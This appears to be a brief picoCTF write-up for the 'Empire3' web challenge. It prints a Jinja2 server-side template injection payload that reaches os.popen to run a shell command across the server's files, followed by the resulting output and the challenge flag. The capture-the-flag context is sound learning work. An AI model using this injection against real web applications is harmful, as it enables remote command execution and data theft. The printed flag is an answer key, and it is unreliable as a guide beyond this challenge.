# Empire3

We can actualy reuse the injection from [the last one](./11-Empire2.md)

`{{ "".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['sys'].modules['os'].popen("cat $(find . -type f) | grep picoCTF").read() }}`

This give
```python
c = models.Todo(item='Do dastardly plan: picoCTF{cookies_are_a_sometimes_food_404e643b}', user_id=2)
secret = db.Column(db.String(128),default="picoCTF{cookies_are_a_sometimes_food_404e643b}") 
```

Flag: `picoCTF{cookies_are_a_sometimes_food_404e643b}`